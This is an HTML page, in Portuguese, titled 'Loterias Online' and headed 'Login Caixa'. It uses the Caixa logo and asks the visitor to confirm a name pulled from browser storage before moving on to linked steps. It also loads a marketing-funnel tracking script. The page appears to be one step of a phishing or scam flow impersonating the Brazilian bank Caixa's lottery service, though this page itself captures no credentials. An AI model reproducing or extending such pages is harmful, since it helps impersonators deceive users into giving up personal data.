<!doctype html>
<html lang="pt-br">
<head>
    <meta charset="utf-8">
    <title>Loterias Online</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js"
            data-utmify-prevent-subids
            async
            defer></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    
    <style>
        @font-face {
            font-family: 'Futura-Book';
            src: url('font/Futura-Book.eot');
            src: url('font/Futura-Book.eot?#iefix') format('embedded-opentype'),
                url('font/Futura-Book.woff2') format('woff2'),
                url('font/Futura-Book.woff') format('woff'),
                url('font/Futura-Book.ttf') format('truetype'),
                url('font/Futura-Book.svg#Futura-Book') format('svg');
            font-weight: normal;
            font-style: normal;
            font-display: swap;
        }

        body {
            font-family: 'Futura-Book' !important;
            background: linear-gradient(45deg, #00a9ad, #005ca9); 
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
        }

        .container-principal {
            background-color: white;
            width: 450px;
            max-width: 95%;
            color: black;
            border-radius: .4rem;
            box-shadow: 0px 4px 8px rgb(0 0 0 / 30%);
            padding: 3rem 4rem;
        }

        @media (max-width: 576px) {
            .container-principal {
                padding: 3rem 2rem !important;
            } 
        }

        .container-principal img {
            width: 150px;
        }

        .container-principal h1 {
            color: #0070ae;
            font-size: 1rem;
            margin-top: .4rem;
            text-align: center;
        }

        .container-principal h2 {
            color: #4d7880;
            font-size: 1.1rem;
            margin-top: 1rem;
            margin-bottom: .5rem;
            width: 100%;
            text-align: justify;
        }

        .container-principal h3 {
            color: #0070ae;
            font-size: 1rem;
            margin-top: 1.1rem;
        }

        .container-principal h3 a{
            color: #0070ae;
            font-weight: 600;
        }

        .container-principal form {
            width: 100%;
            display: flex;
            justify-content: start;
            color: #4d7880;
            font-size: 1.1rem;
            margin-top: .4rem;
        }

        .container-principal form label {
            margin-left: .4rem;
        }

        .botoes {
            margin-top: 1rem;
        }

        .botoes a {
            width: 100%;
        }

        .botoes button  {
            background-color: #f39200;
            color: white;
            font-weight: 500;
            width: 100%;
            border: none;
            padding: .5rem 1rem;
            font-size: 1rem;
            border-radius: .2rem;
            margin-bottom: .6rem;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .botoes button:hover {
            background-color: #173e68;
        }

        button.btn-nao {
             background-color: transparent !important;
             border: solid 2px #f39200;
             color: #f39200;
             cursor: pointer;
             transition: background-color 0.3s ease, color 0.3s ease;
        }
        
        button.btn-nao:hover {
            background-color: #f39200;
            color: white;
        }
      </style>
</head>
<body>
    <div class="container-bg" style=" max-width: 410px; margin-left: 20px; ">
        <div class="container-principal d-flex justify-content-center align-items-center flex-column">
            <img src="img/logo-caixa.webp" alt="Logo Caixa">
            <h1>Login Caixa</h1>
            <h2>Para continuar, confirme se o seu nome está correto.</h2>
            <h2>Nome:</h2>
            <form id="nomeForm">
                <input type="radio" id="nomeCorreto" name="nome" value="correto" checked> 
                <label id="nomeLabel" for="nomeCorreto">NOME NÃO INFORMADO</label><br>
            </form>  
            
            <div class="botoes w-100 d-flex flex-column justify-content-center align-items-center">
                <a href="../3/"><button>Sim, sou eu</button></a>
                <a href="../1/"><button class="btn-nao">Quero alterar meus dados</button></a>
            </div>

            <h3><a href="">Preciso de ajuda</a></h3>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <script>
        if (typeof $ === 'undefined') {
            console.error("jQuery não está carregado.");
        } else {
            console.log("jQuery carregado corretamente. Versão:", $.fn.jquery);
        }
        $(document).ready(function(){
            var nome = localStorage.getItem('nome') || 'NOME NÃO INFORMADO';
            console.log("Nome recuperado do localStorage:", nome);
            nome = nome.toUpperCase();
            $('#nomeLabel').text(nome);
            console.log("Nome atualizado no label:", nome);
        });
    </script>
</body>
</html>
